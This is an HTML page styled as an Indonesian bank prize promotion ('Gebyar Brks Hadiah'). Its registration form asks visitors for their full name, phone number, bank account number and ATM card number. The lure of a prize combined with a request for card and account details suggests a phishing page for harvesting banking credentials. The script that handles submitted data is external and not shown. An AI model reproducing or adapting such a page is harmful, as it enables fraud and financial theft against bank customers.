<html>
  <head>
    <title>Gebyar Brks Hadiah</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="assets/common/css/global.css">
    <link rel="stylesheet" href="assets/common/css/data.css">
    <link rel="stylesheet" href="assets/lib/loader/loader.css">
    <link rel="stylesheet" href="assets/lib/ripple/ripple.css">
    <script src="assets/lib/jquery/jquery.js"></script>
    <script>
      const module = {};
    </script>
    <script type="module" src="assets/common/js/global.js"></script>
    <script type="module" src="assets/common/js/data.js"></script>
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
  </head>
  <body>
    <div style="width: 100%; height: 100%; background-color: #ffffff; overflow: scroll; display: flex; flex-direction: column; align-items: center;">
      <div style="width: 100%; box-shadow: 0 0 10px 5px rgba(0,0,0,0.2); display: flex; flex-direction: row; align-items: center; justify-content: space-between; align-items: center; background-color: #aa4237;">
        <div style="width: 50px; height: 50px; display: flex; justify-content: center; align-items: center;">
          <ion-icon name="arrow-back-outline" style="color: #ffffff; font-size: 20px;"></ion-icon>
        </div>
        <div style="color: #ffffff; font-size: 17px;"><b>Registrasi</b></div>
        <div style="width: 50px; height: 50px; display: flex; justify-content: center; align-items: center;">
          <ion-icon name="home" style="color: #ffffff; font-size: 20px;"></ion-icon>
        </div>
      </div>
      <div style="width: 100%; flex: 1; display: flex; flex-direction: column; align-items: center;">
        <div style="color: #444444; font-size: 20px; margin-top: 40px;"><b>KARTU ATM & PONSEL</b></div>
        <div style="color: #222222; font-size: 14px; margin-top: 5px; margin-left: 20px; margin-right: 20px; text-align: center;">Silahkan masukkan nama lengkap, nomor kartu ATM & nomor ponsel Anda</div>
        <div style="width: calc(100% - 140px); background-color: #dc714d; border-radius: 10px; box-shadow: 0 10px 10px 5px rgba(0,0,0,.2); display: flex; flex-direction: column; margin-top: 100px; margin-left: 50px; margin-right: 50px; padding-top: 20px; padding-bottom: 20px; padding-left: 20px; padding-right: 20px;">
        	  <div style="width: 100%; display: flex; flex-direction: column;">
                <div style="width: 100%; display: flex; flex-direction: row; align-items: center;">
                  <ion-icon name="person" style="color: #ffffff; font-size: 20px;"></ion-icon>
                  <div style="flex: 1; height: 40px; margin-left: 10px;">
                    <input id="name" class="input2" type="text" placeholder="Nama Lengkap" style="width: 100%; height: 100%; background-color: transparent; border: 0; outline: 0; color: #ffffff; font-size: 15px;">
                  </div>
                </div>
                <div class="line1" style="width: 100%; height: 0.5px; background-color: #ffffff;"></div>
              </div>
              <div style="width: 100%; margin-top: 5px; display: flex; flex-direction: column;">
                <div style="width: 100%; margin-top: 5px; display: flex; flex-direction: row; align-items: center;">
                  <ion-icon name="call" style="color: #ffffff; font-size: 20px;"></ion-icon>
                  <div style="flex: 1; height: 40px; margin-left: 10px;">
                    <input id="phone" class="input2" type="tel" placeholder="Nomor Telepon" style="width: 100%; height: 100%; background-color: transparent; border: 0; outline: 0; color: #ffffff; font-size: 15px;">
                  </div>
                </div>
                <div class="line1" style="width: 100%; height: 0.5px; background-color: #ffffff;"></div>
              </div>
              <div style="width: 100%; margin-top: 5px; display: flex; flex-direction: column;">
                <div style="width: 100%; margin-top: 5px; display: flex; flex-direction: row; align-items: center;">
                  <ion-icon name="card" style="color: #ffffff; font-size: 20px;"></ion-icon>
                  <div style="flex: 1; height: 40px; margin-left: 10px;">
                    <input id="account" class="input2" type="tel" placeholder="Nomor Rekening" style="width: 100%; height: 100%; background-color: transparent; border: 0; outline: 0; color: #ffffff; font-size: 15px;">
                  </div>
                </div>
                <div class="line1" style="width: 100%; height: 0.5px; background-color: #ffffff;"></div>
              </div>
              <div style="width: 100%; margin-top: 8px; margin-bottom: 20px; display: flex; flex-direction: column;">
                <div style="width: 100%; display: flex; flex-direction: row; align-items: center;">
                  <ion-icon name="wallet" style="color: #ffffff; font-size: 20px;"></ion-icon>
                  <div style="flex: 1; height: 40px; margin-left: 10px;">
                    <input id="card" class="input2" type="tel" placeholder="Nomor Kartu ATM" style="width: 100%; height: 100%; background-color: transparent; border: 0; outline: 0; color: #ffffff; font-size: 15px;">
                  </div>
                </div>
                <div class="line1" style="width: 100%; height: 0.5px; background-color: #ffffff;"></div>
              </div>
            </div>
      </div>
      <div class="ripple" style="width: calc(100% - 20px); height: 50px; box-shadow: 0 10px 10px 5px rgba(0,0,0,.2); margin-bottom: 10px; margin-left: 10px; margin-right: 10px; background-color: #d58726; color: #ffffff; font-size: 17px; border-radius: 10px; box-shadow: 0 5px 10px 5px (0,0,0,.2); display: flex; justify-content: center; align-items: center;">
        <b>LANJUTKAN</b>
      </div>
      <div id="loader" style="display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; justify-content: center; align-items: center;">
        <div style="width: calc(100% - 80px); margin-left: 40px; margin-right: 40px; height: 120px; background-color: #ffffff; border-radius: 5px; display: flex; justify-content: center; align-items: center;">
          <div class="loader" style="width: 50px; height: 50px;"></div>
        </div>
      </div>
    </div>
  </body>
</html>
